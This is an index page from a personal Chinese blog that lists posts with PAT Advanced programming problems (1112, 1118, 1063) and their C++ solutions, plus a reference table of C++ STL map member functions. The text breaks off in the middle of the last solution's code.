<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <meta name="renderer" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
  <link rel="dns-prefetch" href="http://reehy.top">
  <title>Ree</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="另一个的隐秘角落">
<meta property="og:type" content="website">
<meta property="og:title" content="Ree">
<meta property="og:url" content="http://reehy.top/page/5/index.html">
<meta property="og:site_name" content="Ree">
<meta property="og:description" content="另一个的隐秘角落">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Ree">
<meta name="twitter:description" content="另一个的隐秘角落">
  
    <link rel="alternative" href="/atom.xml" title="Ree" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  <link rel="stylesheet" type="text/css" href="/./main.2d7529.css">
  <style type="text/css">
  
    #container.show {
      background: linear-gradient(200deg,#a0cfe4,#e8c37e);
    }
  </style>
  

  

</head>

<body>
  <div id="container" q-class="show:isCtnShow">
    <canvas id="anm-canvas" class="anm-canvas"></canvas>
    <div class="left-col" q-class="show:isShow">
      
<div class="overlay" style="background: #575B5F"></div>
<div class="intrude-less">
	<header id="header" class="inner">
		<a href="/" class="profilepic">
			<img src="/img/me.jpg" class="js-avatar">
		</a>
		<hgroup>
		  <h1 class="header-author"><a href="/">Ree He</a></h1>
		</hgroup>
		
		<p class="header-subtitle">做一些微不足道的贡献。</p>
		

		<nav class="header-menu">
			<ul>
			
				<li><a href="/">主页</a></li>
	        
				<li><a href="/tags/PWN/">PWN</a></li>
	        
				<li><a href="/tags/PAT/">PAT</a></li>
	        
				<li><a href="/2017/02/17/C-STL使用目录/">STL</a></li>
	        
			</ul>
		</nav>
		<nav class="header-smart-menu">
    		
    			
    			<a q-on="click: openSlider(e, 'innerArchive')" href="javascript:void(0)">所有文章</a>
    			
            
    			
    			<a q-on="click: openSlider(e, 'friends')" href="javascript:void(0)">友链</a>
    			
            
    			
    			<a q-on="click: openSlider(e, 'aboutme')" href="javascript:void(0)">关于我</a>
    			
            
		</nav>
		<nav class="header-nav">
			<div class="social">
				
					<a class="github" target="_blank" href="https://github.com/heyuanree" title="github"><i class="icon-github"></i></a>
		        
					<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
		        
					<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/ree-96/activities" title="zhihu"><i class="icon-zhihu"></i></a>
		        
					<a class="mail" target="_blank" href="mailto:heyuanree@gmail.com" title="mail"><i class="icon-mail"></i></a>
		        
					<a class="google" target="_blank" href="/heyuanree@gmail.com" title="google"><i class="icon-google"></i></a>
		        
			</div>
		</nav>
	</header>		
</div>

    </div>
    <div class="mid-col" q-class="show:isShow,hide:isShow|isFalse">
      
<nav id="mobile-nav">
  	<div class="overlay js-overlay" style="background: #575B5F"></div>
	<div class="btnctn js-mobile-btnctn">
  		<div class="slider-trigger list" q-on="click: openSlider(e)"><i class="icon icon-sort"></i></div>
	</div>
	<div class="intrude-less">
		<header id="header" class="inner">
			<div class="profilepic">
				<img src="/img/me.jpg" class="js-avatar">
			</div>
			<hgroup>
			  <h1 class="header-author js-header-author">Ree He</h1>
			</hgroup>
			
			<p class="header-subtitle"><i class="icon icon-quo-left"></i>做一些微不足道的贡献。<i class="icon icon-quo-right"></i></p>
			
			
			
				
			
				
			
				
			
				
			
			
			
			<nav class="header-nav">
				<div class="social">
					
						<a class="github" target="_blank" href="https://github.com/heyuanree" title="github"><i class="icon-github"></i></a>
			        
						<a class="rss" target="_blank" href="#" title="rss"><i class="icon-rss"></i></a>
			        
						<a class="zhihu" target="_blank" href="https://www.zhihu.com/people/ree-96/activities" title="zhihu"><i class="icon-zhihu"></i></a>
			        
						<a class="mail" target="_blank" href="mailto:heyuanree@gmail.com" title="mail"><i class="icon-mail"></i></a>
			        
						<a class="google" target="_blank" href="/heyuanree@gmail.com" title="google"><i class="icon-google"></i></a>
			        
				</div>
			</nav>

			<nav class="header-menu js-header-menu">
				<ul style="width: 70%">
				
				
					<li style="width: 25%"><a href="/">主页</a></li>
		        
					<li style="width: 25%"><a href="/tags/PWN/">PWN</a></li>
		        
					<li style="width: 25%"><a href="/tags/PAT/">PAT</a></li>
		        
					<li style="width: 25%"><a href="/2017/02/17/C-STL使用目录/">STL</a></li>
		        
				</ul>
			</nav>
		</header>				
	</div>
	<div class="mobile-mask" style="display:none" q-show="isShow"></div>
</nav>

      <div id="wrapper" class="body-wrap">
        <div class="menu-l">
          <div class="canvas-wrap">
            <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
          </div>
          <div id="js-content" class="content-ll">
            
  
    <article id="post-PAT-advanced-1112" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/19/PAT-advanced-1112/">PAT advanced 1112</a>
    </h1>
  

        
        <a href="/2017/02/19/PAT-advanced-1112/" class="archive-article-date">
  	<time datetime="2017-02-19T07:49:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-19</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Descritpion"><a href="#Descritpion" class="headerlink" title="Descritpion"></a>Descritpion</h2><blockquote>
<p>1112.Stucked Keyboard</p>
<p>On a broken keyboard, some of the keys are always stucked. So when you type some sentences, the characters corresponding to those keys will appear repeatedly on screen for k times.</p>
<p>Now given a resulting string on screen, you are supposed to list all the possible stucked keys, and the original string.</p>
<p>Notice that there might be some characters that are typed repeatedly. The stucked key will always repeat output for a fixed k times whenever it is pressed. For example, when k=3, from the string “thiiis iiisss a teeeeeest” we know that the keys “i” and “e” might be stucked, but “s” is not even though it appears repeatedly sometimes. The original string could be “this isss a teest”.</p>
<p>Input Specification:</p>
<p>Each input file contains one test case. For each case, the 1st line gives a positive integer k ( 1&lt;k&lt;=100 ) which is the output repeating times of a stucked key. The 2nd line contains the resulting string on screen, which consists of no more than 1000 characters from {a-z}, {0-9} and “_“. It is guaranteed that the string is non-empty.</p>
<p>Output Specification:</p>
<p>For each test case, print in one line the possible stucked keys, in the order of being detected. Make sure that each key is printed once only. Then in the next line print the original string. It is guaranteed that there is at least one stucked key.</p>
<p>Sample Input:<br>3<br>caseee1__thiiis_iiisss_a_teeeeeest</p>
<p>Sample Output:<br>ei<br>case1__this_isss_a_teest</p>
</blockquote>
<p>注意：必须全部输入才能判断坏键，如<code>sss_s</code>已判断为坏键为错误。一旦确定为好键则不会修改为坏键。</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</div><div class="line"></div><div class="line"><span class="keyword">int</span> k;</div><div class="line"><span class="keyword">int</span> cou = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> sta = <span class="number">0</span>;</div><div class="line"><span class="keyword">char</span> pre;</div><div class="line"><span class="built_in">string</span> mes;</div><div class="line"><span class="built_in">string</span> ans = <span class="string">""</span>;</div><div class="line"><span class="built_in">string</span> wrong = <span class="string">""</span>;</div><div class="line"><span class="built_in">map</span>&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; m;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;k);</div><div class="line">	<span class="built_in">cin</span> &gt;&gt; mes;</div><div class="line">	mes += <span class="string">'#'</span>;</div><div class="line">	m.insert(pair&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt;(<span class="string">'_'</span>, <span class="number">-1</span>));</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="string">'a'</span>; i &lt;= <span class="string">'z'</span>; i++)</div><div class="line">		m.insert(pair&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt;(i, <span class="number">-1</span>));</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">char</span> i = <span class="string">'0'</span>; i &lt;= <span class="string">'9'</span>; i++)</div><div class="line">		m.insert(pair&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt;(i, <span class="number">-1</span>));</div><div class="line">	pre = mes[<span class="number">0</span>];</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mes.length(); i++)</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">if</span> (pre == mes[i])</div><div class="line">		&#123;</div><div class="line">			sta = <span class="number">0</span>;</div><div class="line">			cou++;</div><div class="line">		&#125;</div><div class="line">		<span class="keyword">else</span></div><div class="line">		&#123;</div><div class="line">			sta = <span class="number">1</span>;</div><div class="line">			<span class="keyword">if</span> (cou % k == <span class="number">0</span> &amp;&amp; m[pre] == <span class="number">-1</span>)</div><div class="line">			&#123;</div><div class="line">				m[pre] = <span class="number">0</span>;</div><div class="line">				wrong += pre;</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">if</span> (cou % k != <span class="number">0</span>)</div><div class="line">			&#123;</div><div class="line">				m[pre] = <span class="number">1</span>;</div><div class="line">			&#125;</div><div class="line">			pre = mes[i];</div><div class="line">			cou = <span class="number">1</span>;</div><div class="line">			<span class="keyword">continue</span>;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; wrong.size(); i++)</div><div class="line">		<span class="keyword">if</span> (m[wrong[i]] == <span class="number">0</span>)</div><div class="line">			<span class="built_in">cout</span> &lt;&lt; wrong[i];</div><div class="line">	<span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mes.size() - <span class="number">1</span>;)</div><div class="line">		<span class="keyword">if</span> (m[mes[i]])</div><div class="line">		&#123; <span class="built_in">cout</span> &lt;&lt; mes[i]; i++; &#125;</div><div class="line">		<span class="keyword">else</span></div><div class="line">		&#123; <span class="built_in">cout</span> &lt;&lt; mes[i]; i += k; &#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PAT</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/19/PAT-advanced-1112/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-C-STL-Map" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/19/C-STL-Map/">C++ STL Map</a>
    </h1>
  

        
        <a href="/2017/02/19/C-STL-Map/" class="archive-article-date">
  	<time datetime="2017-02-19T03:36:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-19</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="map"><a href="#map" class="headerlink" title="map"></a>map</h2><p><code>map</code>是STL的一个关联容器，提供<code>key</code>到<code>value</code>映射，类似<code>python</code>里的字典的功能。<code>map</code>内自建一棵红黑树，具有对数据自动排序的功能，所以<code>map</code>内部的所有数据都是有序的。</p>
<p><code>#include&lt;map&gt;</code><br><code>map&lt;key, value&gt; key_to_value</code></p>
<h2 id="成员函数"><a href="#成员函数" class="headerlink" title="成员函数"></a>成员函数</h2><table>
<thead>
<tr>
<th style="text-align:center">函数</th>
<th style="text-align:center">用法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">begin()</td>
<td style="text-align:center">返回指向<code>map</code>头部的迭代器</td>
</tr>
<tr>
<td style="text-align:center">clear()</td>
<td style="text-align:center">删除所有元素</td>
</tr>
<tr>
<td style="text-align:center">count(elem)</td>
<td style="text-align:center">返回指定出现的次数</td>
</tr>
<tr>
<td style="text-align:center">empty()</td>
<td style="text-align:center">判断是否空</td>
</tr>
<tr>
<td style="text-align:center">end()</td>
<td style="text-align:center">指向<code>map</code>末尾的迭代器</td>
</tr>
<tr>
<td style="text-align:center">equal_range()</td>
<td style="text-align:center">返回特殊条目的迭代器对</td>
</tr>
<tr>
<td style="text-align:center">erase()</td>
<td style="text-align:center">删除一个元素</td>
</tr>
<tr>
<td style="text-align:center">find()</td>
<td style="text-align:center">查找一个元素</td>
</tr>
<tr>
<td style="text-align:center">get_allocator()</td>
<td style="text-align:center">返回<code>map</code>的配置器</td>
</tr>
<tr>
<td style="text-align:center">insert()</td>
<td style="text-align:center">插入元素</td>
</tr>
<tr>
<td style="text-align:center">key_comp()</td>
<td style="text-align:center">返回比较元素<code>key</code>的函数</td>
</tr>
<tr>
<td style="text-align:center">lower_bound()</td>
<td style="text-align:center">返回键值&gt;=给定元素的第一个位置</td>
</tr>
<tr>
<td style="text-align:center">max_size()</td>
<td style="text-align:center">返回可以容纳的最大元素数</td>
</tr>
<tr>
<td style="text-align:center">rebign()</td>
<td style="text-align:center">返回一个可以指向<code>map</code>尾部的逆向迭代器</td>
</tr>
<tr>
<td style="text-align:center">rend()</td>
<td style="text-align:center">返回一个指向<code>map</code>头部的逆向迭代器</td>
</tr>
<tr>
<td style="text-align:center">size()</td>
<td style="text-align:center">返回<code>map</code>中元素的数目</td>
</tr>
<tr>
<td style="text-align:center">swap()</td>
<td style="text-align:center">交换两个<code>map</code></td>
</tr>
<tr>
<td style="text-align:center">upper_bound()</td>
<td style="text-align:center">返回键值&gt;给定元素的第一个位置</td>
</tr>
<tr>
<td style="text-align:center">value_comp()</td>
<td style="text-align:center">返回比较<code>value</code>的函数</td>
</tr>
</tbody>
</table>

      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">STL</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/19/C-STL-Map/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-PAT-advanced-1118" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/19/PAT-advanced-1118/">PAT advanced 1118</a>
    </h1>
  

        
        <a href="/2017/02/19/PAT-advanced-1118/" class="archive-article-date">
  	<time datetime="2017-02-19T02:37:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-19</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>1118.Birds in Forest</p>
<p>Some scientists took pictures of thousands of birds in a forest. Assume that all the birds appear in the same picture belong to the same tree. You are supposed to help the scientists to count the maximum number of trees in the forest, and for any pair of birds, tell if they are on the same tree.</p>
<p>Input Specification:</p>
<p>Each input file contains one test case. For each case, the first line contains a positive number N (&lt;= 104) which is the number of pictures. Then N lines follow, each describes a picture in the format:<br>K B1 B2 … BK<br>where K is the number of birds in this picture, and Bi’s are the indices of birds. It is guaranteed that the birds in all the pictures are numbered continuously from 1 to some number that is no more than 104.</p>
<p>After the pictures there is a positive number Q (&lt;= 104) which is the number of queries. Then Q lines follow, each contains the indices of two birds.</p>
<p>Output Specification:</p>
<p>For each test case, first output in a line the maximum possible number of trees and the number of birds. Then for each query, print in a line “Yes” if the two birds belong to the same tree, or “No” if not.</p>
<p>Sample Input:<br>4<br>3 10 1 2<br>2 3 4<br>4 1 5 7 8<br>3 9 6 4<br>2<br>10 5<br>3 7</p>
<p>Sample Output:<br>2 10<br>Yes<br>No</p>
</blockquote>
<p>查并集问题，知道了就好做了。</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxN = <span class="number">1e4</span> + <span class="number">10</span>;</div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxQ = <span class="number">1e4</span> + <span class="number">10</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n, q;</div><div class="line"><span class="keyword">int</span> x, y, z;</div><div class="line"><span class="keyword">int</span> a, b;</div><div class="line"><span class="keyword">int</span> pre[maxN + <span class="number">1</span>];</div><div class="line"><span class="keyword">int</span> fa[maxN + <span class="number">1</span>];</div><div class="line"><span class="keyword">bool</span> e[maxN + <span class="number">1</span>];</div><div class="line"><span class="keyword">int</span> bn, tn;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> r = x;</div><div class="line">	<span class="keyword">while</span> (pre[r] != r)</div><div class="line">		r = pre[r];</div><div class="line">	<span class="keyword">int</span> i = x, j;</div><div class="line">	<span class="keyword">while</span> (i != r)</div><div class="line">	&#123;</div><div class="line">		j = pre[i];</div><div class="line">		pre[i] = r;</div><div class="line">		i = j;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> r;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">join</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span></span></div><div class="line">&#123;</div><div class="line">	<span class="keyword">int</span> fx = find(x), fy = find(y);</div><div class="line">	<span class="keyword">if</span> (fx != fy)</div><div class="line">		pre[fy] = fx;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= maxN; i++)</div><div class="line">		pre[i] = i;</div><div class="line">	<span class="keyword">while</span> (n--)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</div><div class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;y);</div><div class="line">		e[y] = <span class="literal">true</span>;</div><div class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; x - <span class="number">1</span>; i++)</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;z);</div><div class="line">			e[z] = <span class="literal">true</span>;</div><div class="line">			<span class="keyword">if</span> (z != find(z))</div><div class="line">			&#123;</div><div class="line">				join(y, z);</div><div class="line">				fa[z] = find(y);</div><div class="line">			&#125;</div><div class="line">			<span class="keyword">else</span></div><div class="line">			&#123;</div><div class="line">				join(z, y);</div><div class="line">				fa[y] = find(z);</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= maxN + <span class="number">1</span>; i++)</div><div class="line">		<span class="keyword">if</span> (e[i])</div><div class="line">		&#123;</div><div class="line">			bn++;</div><div class="line">			<span class="keyword">if</span> (pre[i] == i)tn++;</div><div class="line">		&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"%d %d\n"</span>, tn, bn);</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;q);</div><div class="line">	<span class="keyword">while</span> (q--)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;a, &amp;b);</div><div class="line">		(find(a) == find(b)) ? <span class="built_in">printf</span>(<span class="string">"Yes\n"</span>) : <span class="built_in">printf</span>(<span class="string">"No\n"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
      

      
    </div>
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">PAT</a>
        		</li>
      		
		</ul>
	</div>

      

      
        <p class="article-more-link">
          <a class="article-more-a" href="/2017/02/19/PAT-advanced-1118/">展开全文 >></a>
        </p>
      

      
      <div class="clearfix"></div>
    </div>
  </div>
</article>








  
    <article id="post-PAT-advanced-1063" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2017/02/18/PAT-advanced-1063/">PAT advanced 1063</a>
    </h1>
  

        
        <a href="/2017/02/18/PAT-advanced-1063/" class="archive-article-date">
  	<time datetime="2017-02-18T10:32:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-02-18</time>
</a>
        
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><blockquote>
<p>1063.Set Similarity</p>
<p>Given two sets of integers, the similarity of the sets is defined to be Nc/Nt*100%, where Nc is the number of distinct common numbers shared by the two sets, and Nt is the total number of distinct numbers in the two sets. Your job is to calculate the similarity of any given pair of sets.</p>
<p>Input Specification:</p>
<p>Each input file contains one test case. Each case first gives a positive integer N (&lt;=50) which is the total number of sets. Then N lines follow, each gives a set with a positive M (&lt;=104) and followed by M integers in the range [0, 109]. After the input of sets, a positive integer K (&lt;=2000) is given, followed by K lines of queries. Each query gives a pair of set numbers (the sets are numbered from 1 to N). All the numbers in a line are separated by a space.</p>
<p>Output Specification:</p>
<p>For each query, print in one line the similarity of the sets, in the percentage form accurate up to 1 decimal place.</p>
<p>Sample Input:<br>3<br>3 99 87 101<br>4 87 101 5 87<br>7 99 101 18 5 135 18 99<br>2<br>1 2<br>1 3</p>
<p>Sample Output:<br>50.0%<br>33.3%</p>
</blockquote>
<p>学习了几点简单的优化吧：</p>
<ul>
<li><code>int</code>比<code>float</code>运算快</li>
<li><code>scnaf</code>和<code>printf</code>比<code>cin</code>和<code>cout</code>运算快</li>
<li>一段程序比多段程序运算快（是不是把编译时间算上去了？还是<code>call</code>是一个耗时的指令？）</li>
</ul>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;set&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> LL;</div><div class="line"></div><div class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxN = <span class="number">5e1</span> + <span class="number">10</span>;</div><div class="line"></div><div class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; s[maxN];</div><div class="line"><span class="keyword">int</span> n, ni;</div><div class="line"><span class="keyword">int</span> a, b;</div><div class="line"><span class="keyword">int</span> x, o;</div><div class="line"><span class="keyword">int</span> inN = <span class="number">0</span>;</div><div class="line"><span class="keyword">int</span> allN = <span class="number">0</span>;</div><div class="line"><span class="keyword">float</span> ans = <span class="number">0</span>;</div><div class="line"><span class="built_in">set</span>&lt;<span class="keyword">int</span>&gt; ::iterator it;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;n);</div><div class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;ni);</div><div class="line">		<span class="keyword">while</span> (ni--)</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;x);</div><div class="line">			s[i].insert(x);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;o);</div><div class="line">	<span class="keyword">while</span> (o--)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">scanf</span>(<span class="string">"%d%d"</span>, &amp;a, &amp;b);</div><div class="line">		inN = <span class="number">0</span>; allN = <span class="number">0</span>; ans = <span 